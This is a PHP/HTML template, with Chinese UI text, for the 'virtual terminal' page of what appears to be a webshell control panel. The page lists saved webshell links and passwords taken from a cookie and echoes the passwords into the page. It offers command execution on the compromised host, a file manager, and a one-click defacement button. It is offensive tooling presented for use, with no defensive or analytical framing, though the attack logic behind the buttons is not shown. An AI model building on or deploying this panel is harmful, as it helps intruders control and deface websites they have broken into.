<div id="content" class="app-content" role="main">
    <div class="app-content-body ">
<div class="bg-light lter b-b wrapper-md hidden-print">
  <h1 class="m-n font-thin h3">虚拟终端</h1>
</div>
<div class="wrapper-md control">
    <div class="panel panel-default">
        <div class="panel-heading font-bold">
        虚拟终端
        </div>
        <div class="panel-body">
        <!--顶部-->
      <div class="row wrapper" id="top_file">
        <div class="col-sm-5 m-b-xs">
            <div class="form-group">
              <select class="input-sm form-control" id="link" name="link">
              <option value="null">请选择连接</option>
              <?php
              if (isset($_COOKIE["webshell"]))
              {
                  foreach ($_COOKIE["webshell"] as $link => $pass)
                  {
                  echo "<option value=\"".htmlentities($link)."|".htmlentities($pass)."\">链接：".htmlentities($link)." 密码：".htmlentities($pass)." </option>";
                  }
              }
              ?>
              </select>
            </div>
             <div class="form-group">
                <button class="btn btn-sm btn-primary" onclick="linkTerminal()" type="submit">连接终端</button>
             </div>
        </div>
      </div>
      <div class="row wrapper" id="tool" style="display:none">
        <div class="col-sm-5 m-b-xs">
            <div class="form-group">
                <button class="btn btn-sm btn-primary" onclick="alertHack()" type="submit">一键挂黑</button>
                <button class="btn btn-sm btn-success" onclick="javascript:window.location.href='?file'" type="submit">文件管理</button>
                <button class="btn btn-sm btn-danger" onclick="colseTerminal()" type="submit">关闭虚拟终端</button>
            </div>
        </div>
      </div>
      <!--顶部-->
      <!--列表-->
      <div class="form-group" id="table" style="display:none">
          <div id="terminal">

            <p id="screen">请输入指令后点击"执行"</p>
              <div class="input-group" style="height:30px;width:100%">
                 <input id="order" type="text" class="form-control" placeholder="请输入命令，如：ipconfig">
                  <span class="input-group-btn">
                     <input type="submit" class="btn btn-default" onclick="sendTerminal()" value="执行" />
                  </span>
              </div>
          </div>
      </div>
    <!--列表-->
    </div>
  </div>
  <script type="text/javascript">
  $("#tool").hide();
  $("#table").hide();
  if(isPc()){
    $("#screen").css({"height":"400px","width":"100%","background":"#000","padding":"10px","color":"#00FF00","overflow":"auto"});
  }else{
    $("#screen").css({"width":"100%","background":"#000","padding":"10px","color":"#00FF00"});
  }
  </script>